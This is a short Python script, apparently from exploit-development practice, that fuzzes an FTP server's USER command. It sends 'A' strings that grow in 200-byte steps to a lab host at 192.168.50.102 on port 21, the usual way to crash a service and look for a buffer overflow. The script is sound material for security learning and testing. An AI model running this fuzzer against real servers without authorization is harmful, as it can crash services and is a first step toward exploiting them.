#!/usr/bin/python
import socket

buf = ['A']
elemento = 100

while len(buf) <= 30:
    buf.append("A"*elemento)
    elemento = elemento + 200

for string in buf:
    print("Fuzzing FTP USER %s bytes" %len(string))
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.50.102", 21))
    s.send(b"USER " + string.encode() + b" \r\n")
